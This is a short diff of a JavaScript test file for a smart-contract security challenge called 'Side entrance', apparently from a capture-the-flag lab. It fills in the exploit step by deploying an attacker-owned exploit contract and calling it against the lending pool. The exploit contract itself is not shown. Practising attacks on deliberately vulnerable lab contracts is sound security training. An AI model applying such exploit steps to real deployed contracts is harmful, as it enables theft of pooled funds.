@@ -26,6 +26,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const SideEntraceLenderExploit = contract.fromArtifact('SideEntraceLenderExploit');
+        this.exploit = await SideEntraceLenderExploit.new({ from: attacker });
+        await this.exploit.exploit(this.pool.address, {from: attacker})
     });
 
     after(async function () {
